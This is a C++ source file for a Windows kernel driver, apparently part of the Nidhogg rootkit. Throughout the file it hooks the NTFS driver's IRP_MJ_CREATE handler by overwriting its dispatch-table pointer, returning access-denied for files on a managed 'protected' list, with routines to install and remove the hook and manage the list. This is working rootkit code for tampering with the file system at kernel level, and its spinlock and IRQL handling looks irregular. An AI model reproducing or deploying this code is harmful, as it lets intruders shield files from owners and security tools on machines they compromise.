#include "pch.h"
#include "FileUtils.h"
#include "MemoryAllocator.hpp"
#include "MemoryHelper.hpp"

FileUtils::FileUtils() {
	this->Files.FilesCount = 0;
	this->Files.LastIndex = 0;

	for (int i = 0; i < SUPPORTED_HOOKED_NTFS_CALLBACKS; i++)
		this->Callbacks[i].Activated = false;

	memset(&this->Files, 0, sizeof(this->Files));
	this->Lock.Init();
}

FileUtils::~FileUtils() {
	AutoLock locker(this->Lock);

	for (ULONG i = 0; i <= this->Files.LastIndex; i++) {
		if (this->Files.FilesPath[i] != nullptr) {
			ExFreePoolWithTag(this->Files.FilesPath[i], DRIVER_TAG);
			this->Files.FilesPath[i] = nullptr;
		}
	}
	this->Files.FilesCount = 0;
	this->Files.LastIndex = 0;

	// Uninstalling NTFS hooks if there are any.
	if (this->Callbacks[0].Activated)
		UninstallNtfsHook(IRP_MJ_CREATE);
}

/*
* Description:
* HookedNtfsIrpCreate is responsible for handling the NTFS IRP_MJ_CREATE.
*
* Parameters:
* @DeviceObject [PDEVICE_OBJECT] -- Unused.
* @Irp			[PIRP]			 -- Received IRP.
*
* Returns:
* @status		[NTSTATUS]		 -- Whether the operation was successful or not.
*/
NTSTATUS HookedNtfsIrpCreate(PDEVICE_OBJECT DeviceObject, PIRP Irp) {
	auto stack = IoGetCurrentIrpStackLocation(Irp);
	UNICODE_STRING fullPath = {0};
	KIRQL prevIrql = 0;
	NTSTATUS status = STATUS_SUCCESS;

	do {
		// Validating the file object.
		if (!stack || !stack->FileObject)
			break;

		if (stack->FileObject->FileName.Length == 0 || !stack->FileObject->FileName.Buffer)
			break;

		// Validating the address of the file name.
		status = ProbeAddress(stack->FileObject->FileName.Buffer, stack->FileObject->FileName.Length,
			sizeof(WCHAR*), STATUS_NOT_FOUND);

		if (!NT_SUCCESS(status))
			break;

		// Acquiring the lock to prevent accessing to the file from other drivers.
		KeAcquireSpinLock(&stack->FileObject->IrpListLock, &prevIrql);
		KeLowerIrql(prevIrql);

		status = CopyUnicodeString(PsGetCurrentProcess(), &stack->FileObject->FileName, PsGetCurrentProcess(), &fullPath, 
			KernelMode);

		if (!NT_SUCCESS(status) || !fullPath.Buffer)
			break;

		KeRaiseIrql(DISPATCH_LEVEL, &prevIrql);
		KeReleaseSpinLock(&stack->FileObject->IrpListLock, prevIrql);

		if (NidhoggFileUtils->FindFile(fullPath.Buffer)) {
			ExFreePoolWithTag(fullPath.Buffer, DRIVER_TAG);
			Irp->IoStatus.Status = STATUS_ACCESS_DENIED;
			return STATUS_SUCCESS;
		}
	} while (false);

	if (fullPath.Buffer)
		ExFreePoolWithTag(fullPath.Buffer, DRIVER_TAG);
	return ((tNtfsIrpFunction)NidhoggFileUtils->GetNtfsCallback(0).Address)(DeviceObject, Irp);
}

/*
* Description:
* InstallNtfsHook is responsible for applying NTFS hooks of given IRP.
*
* Parameters:
* @irpMjFunction [int]		-- IRP function.
*
* Returns:
* @status		 [NTSTATUS] -- Whether hooked or not.
*/
NTSTATUS FileUtils::InstallNtfsHook(int irpMjFunction) {
	UNICODE_STRING ntfsName;
	PDRIVER_OBJECT ntfsDriverObject = nullptr;
	NTSTATUS status = STATUS_SUCCESS;

	RtlInitUnicodeString(&ntfsName, L"\\FileSystem\\NTFS");
	status = ObReferenceObjectByName(&ntfsName, OBJ_CASE_INSENSITIVE, NULL, 0, *IoDriverObjectType, KernelMode, NULL, (PVOID*)&ntfsDriverObject);

	if (!NT_SUCCESS(status))
		return status;

	switch (irpMjFunction) {
		case IRP_MJ_CREATE: {
			this->Callbacks[0].Address = (PVOID)InterlockedExchange64((LONG64*)&ntfsDriverObject->MajorFunction[IRP_MJ_CREATE], (LONG64)HookedNtfsIrpCreate);
			this->Callbacks[0].Activated = true;
			break;
		}
		default:
			status = STATUS_NOT_SUPPORTED;
	}

	ObDereferenceObject(ntfsDriverObject);
	return status;
}

/*
* Description:
* UninstallNtfsHook is responsible for removing NTFS hooks of given IRP.
*
* Parameters:
* @irpMjFunction [int]		-- IRP function.
*
* Returns:
* @status		 [NTSTATUS] -- Whether removed or not.
*/
NTSTATUS FileUtils::UninstallNtfsHook(int irpMjFunction) {
	UNICODE_STRING ntfsName;
	PDRIVER_OBJECT ntfsDriverObject = NULL;
	NTSTATUS status = STATUS_SUCCESS;

	RtlInitUnicodeString(&ntfsName, L"\\FileSystem\\NTFS");

	status = ObReferenceObjectByName(&ntfsName, OBJ_CASE_INSENSITIVE, NULL, 0, *IoDriverObjectType, KernelMode, NULL, (PVOID*)&ntfsDriverObject);

	if (!NT_SUCCESS(status))
		return status;

	switch (irpMjFunction) {
	case IRP_MJ_CREATE: {
		InterlockedExchange64((LONG64*)&ntfsDriverObject->MajorFunction[irpMjFunction], (LONG64)this->Callbacks[0].Address);
		this->Callbacks[0].Address = nullptr;
		this->Callbacks[0].Activated = false;
		break;
	}
	default:
		status = STATUS_NOT_SUPPORTED;
	}

	ObDereferenceObject(ntfsDriverObject);

	return status;
}


/*
* Description:
* FindFile is responsible for searching if a file exists in the protected files list.
*
* Parameters:
* @path   [WCHAR*] -- File's path.
*
* Returns:
* @status [bool]   -- Whether found or not.
*/
bool FileUtils::FindFile(WCHAR* path) {
	AutoLock locker(this->Lock);

	for (ULONG i = 0; i <= this->Files.LastIndex; i++) {
		if (this->Files.FilesPath[i]) {

			// Checking the file path without the drive letter.
			if (wcslen(this->Files.FilesPath[i]) > 3) {
				if (_wcsnicmp(&this->Files.FilesPath[i][2], path, wcslen(this->Files.FilesPath[i]) - 2) == 0)
					return true;
			}
		}
	}
	return false;
}

/*
* Description:
* AddFile is responsible for adding a file to the protected files list.
*
* Parameters:
* @path   [WCHAR*] -- File's path.
*
* Returns:
* @status [bool]   -- Whether successfully added or not.
*/
bool FileUtils::AddFile(WCHAR* path) {
	AutoLock locker(this->Lock);

	for (ULONG i = 0; i < MAX_FILES; i++)
		if (this->Files.FilesPath[i] == nullptr) {
			SIZE_T len = (wcslen(path) + 1) * sizeof(WCHAR);
			WCHAR* buffer = AllocateMemory<WCHAR*>(len);

			// Not enough resources.
			if (!buffer) {
				break;
			}
			errno_t err = wcscpy_s(buffer, len / sizeof(WCHAR), path);
			
			if (err != 0) {
				ExFreePoolWithTag(buffer, DRIVER_TAG);
				break;
			}

			if (i > this->Files.LastIndex)
				this->Files.LastIndex = i;

			this->Files.FilesPath[i] = buffer;
			this->Files.FilesCount++;

			if (!this->Callbacks[0].Activated) {
				NTSTATUS status = this->InstallNtfsHook(IRP_MJ_CREATE);

				if (!NT_SUCCESS(status)) {
					this->RemoveFile(this->Files.FilesPath[i]);
					break;
				}
			}
			return true;
		}
	return false;
}

/*
* Description:
* RemoveFile is responsible for removing a file from the protected files list.
*
* Parameters:
* @path   [WCHAR*] -- File's path.
*
* Returns:
* @status [bool]   -- Whether successfully removed or not.
*/
bool FileUtils::RemoveFile(WCHAR* path) {
	ULONG newLastIndex = 0;
	AutoLock locker(this->Lock);

	for (ULONG i = 0; i <= this->Files.LastIndex; i++) {
		if (this->Files.FilesPath[i] != nullptr) {
			if (_wcsicmp(this->Files.FilesPath[i], path) == 0) {
				ExFreePoolWithTag(this->Files.FilesPath[i], DRIVER_TAG);

				if (i == this->Files.LastIndex)
					this->Files.LastIndex = newLastIndex;
				this->Files.FilesPath[i] = nullptr;
				this->Files.FilesCount--;

				if (this->GetFilesCount() == 0 && this->Callbacks[0].Activated) {
					NTSTATUS status = this->UninstallNtfsHook(IRP_MJ_CREATE);

					if (!NT_SUCCESS(status))
						break;
				}
				return true;
			}
			else
				newLastIndex = i;
		}
	}
	return false;
}

/*
* Description:
* ClearFilesList is responsible for clearing the protected files list.
*
* Parameters:
* There are no parameters.
*
* Returns:
* There is no return value.
*/
void FileUtils::ClearFilesList() {
	AutoLock locker(this->Lock);

	for (ULONG i = 0; i <= this->Files.LastIndex; i++) {
		if (this->Files.FilesPath[i]) {
			ExFreePoolWithTag(this->Files.FilesPath[i], DRIVER_TAG);
			this->Files.FilesPath[i] = nullptr;
		}
	}

	this->Files.LastIndex = 0;
	this->Files.FilesCount = 0;
}

/*
* Description:
* QueryFiles is responsible for getting a protected file.
*
* Parameters:
* @item   [FileItem*] -- Protected file to get.
*
* Returns:
* @status [NTSTATUS]  -- Whether successfully copied or not.
*/
NTSTATUS FileUtils::QueryFiles(FileItem* item) {
	NTSTATUS status = STATUS_SUCCESS;
	errno_t err = 0;
	AutoLock locker(this->Lock);

	if (item->FileIndex == 0) {
		item->FileIndex = this->Files.FilesCount;

		if (this->Files.FilesCount > 0) {
			err = wcscpy_s(item->FilePath, this->Files.FilesPath[0]);

			if (err != 0)
				status = STATUS_INVALID_USER_BUFFER;
		}
	}
	else if (item->FileIndex > this->Files.LastIndex) {
		status = STATUS_INVALID_PARAMETER;
	}
	else {
		if (this->Files.FilesPath[item->FileIndex] == nullptr)
			return STATUS_INVALID_PARAMETER;

		err = wcscpy_s(item->FilePath, this->Files.FilesPath[item->FileIndex]);

		if (err != 0)
			status = STATUS_INVALID_USER_BUFFER;
	}

	return status;
}
